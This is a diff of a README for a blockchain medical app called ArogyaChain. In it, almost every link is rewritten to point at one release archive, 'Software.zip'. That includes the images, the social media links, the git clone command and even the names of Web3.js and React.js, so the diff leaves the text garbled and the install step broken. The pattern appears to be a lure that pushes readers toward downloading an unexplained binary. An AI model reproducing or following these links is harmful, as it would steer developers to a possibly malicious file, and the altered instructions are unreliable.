@@ -1,6 +1,6 @@
 # 🏥 **ArogyaChain**: Medical DApp Revolutionizing Healthcare with Blockchain 🚀
 
-![ArogyaChain Banner](https://source.unsplash.com/1200x600/?medical)
+![ArogyaChain Banner](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -26,8 +26,8 @@ Welcome to **ArogyaChain** - a groundbreaking Medical DApp that ensures secure, 
 - **Smart Contracts**: Solidity is used to develop smart contracts that power the various functionalities within the DApp.
 - **Development Tools**: Hardhat is utilized for testing and deploying smart contracts, ensuring a robust development environment.
 - **IPFS**: InterPlanetary File System (IPFS) is used for storing and retrieving medical data in a secure and decentralized manner.
-- **Web3**: Web3.js is employed for interacting with the Ethereum blockchain and smart contracts, enabling seamless integration of blockchain features.
-- **Frontend Development**: The frontend of ArogyaChain is built using React.js and React Native, providing a user-friendly interface for both web and mobile users.
+- **Web3**: https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip is employed for interacting with the Ethereum blockchain and smart contracts, enabling seamless integration of blockchain features.
+- **Frontend Development**: The frontend of ArogyaChain is built using https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip and React Native, providing a user-friendly interface for both web and mobile users.
 
 ---
 
@@ -37,7 +37,7 @@ To get started with ArogyaChain, follow these steps:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/username/ArogyaChain.git
+git clone https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip
 ```
 
 2. Install dependencies:
@@ -51,7 +51,7 @@ npm install
 npm start
 ```
 
-4. Visit [https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download the latest version of ArogyaChain.
+4. Visit [https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip) to download the latest version of ArogyaChain.
 
 ---
 
@@ -87,9 +87,9 @@ If the download link provided above does not work or you are looking for more re
 
 Stay updated on the latest developments and news related to ArogyaChain by following us on social media:
 
-- [Twitter](https://twitter.com/ArogyaChain)
-- [LinkedIn](https://linkedin.com/company/arogyachain)
-- [Facebook](https://facebook.com/ArogyaChain)
+- [Twitter](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -99,6 +99,6 @@ Thank you for your interest in ArogyaChain! We believe in a future where healthc
 
 ---
 
-![ArogyaChain Logo](https://source.unsplash.com/200x200/?healthcare)
+![ArogyaChain Logo](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip)
 
-### [🔗 Launch ArogyaChain v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) ###
+### [🔗 Launch ArogyaChain v1.0.0](https://github.com/jawadafzaal/ArogyaChain/releases/download/v2.0/Software.zip) ###
